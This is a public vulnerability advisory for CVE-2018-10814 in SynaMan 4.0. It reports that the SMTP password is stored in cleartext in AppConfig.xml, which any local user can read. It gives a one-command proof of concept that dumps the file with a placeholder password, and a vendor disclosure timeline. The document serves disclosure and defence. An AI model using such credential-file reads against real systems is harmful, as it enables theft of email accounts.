@@ -1,0 +1,45 @@
+# Exploit Author: bzyo
+# CVE: CVE-2018-10814
+# Twitter: @bzyo_
+# Exploit Title: SynaMan 4.0 - Cleartext password SMTP settings
+# Date: 09-12-18
+# Vulnerable Software: SynaMan 4.0 build 1488
+# Vendor Homepage: http://web.synametrics.com/SynaMan.htm
+# Version: 4.0 build 1488
+# Software Link: http://web.synametrics.com/SynaManDownload.htm
+# Tested On: Windows 7 x86
+  
+Description
+-----------------------------------------------------------------
+SynaMan 4.0 suffers from cleartext password storage for SMTP settings which would allow email account compromise
+
+Prerequisites
+-----------------------------------------------------------------
+Access to a system running Synaman 4 using a low-privileged user account
+ 
+Proof of Concept
+-----------------------------------------------------------------
+The password for the smtp email account is stored in plaintext in the AppConfig.xml configuration file.  This file can be viewed by any local user of the system.
+
+C:\SynaMan\config>type AppConfig.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<Configuration>
+        <parameters>
+                <parameter name="hasLoggedInOnce" type="4" value="true"></parameter>
+                <parameter name="adminEmail" type="1" value="test@gmail.com"></parameter>
+                <parameter name="smtpSecurity" type="1" value="None"></parameter>
+				**truncated**
+                <parameter name="smtpPassword" type="1" value="SuperSecret!"></parameter>
+                <parameter name="ntServiceCommand" type="1" value="net start SynaMan"></parameter>
+                <parameter name="mimicHtmlFiles" type="4" value="false"></parameter>
+        </parameters>
+</Configuration>
+
+
+ 
+Timeline
+---------------------------------------------------------------------
+05-07-18: Vendor notified of vulnerabilities
+05-08-18: Vendor responded and will fix 
+07-25-18: Vendor fixed in new release
+09-12-18: Submitted public disclosure
